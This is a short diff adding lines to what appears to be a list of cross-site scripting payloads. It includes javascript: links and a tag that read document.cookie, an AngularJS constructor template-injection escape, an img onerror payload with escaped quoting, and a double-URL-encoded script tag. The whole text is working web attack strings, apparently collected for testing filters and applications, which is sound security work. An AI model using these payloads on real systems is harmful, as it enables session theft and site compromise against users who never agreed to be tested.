@@ -1,3 +1,5 @@
+<a href=javascript:alert(document.cookie);>...</a>
+<javascript:alert(document.cookie);>
 {{constructor.constructor('alert(document.domain)')()}}
 <img src=x style=font:\u0022'/{/onerror=alert(document.cookie)//>",
 %253Cscript%253Ealert(‘XSS’)%253C%252Fscript%253E
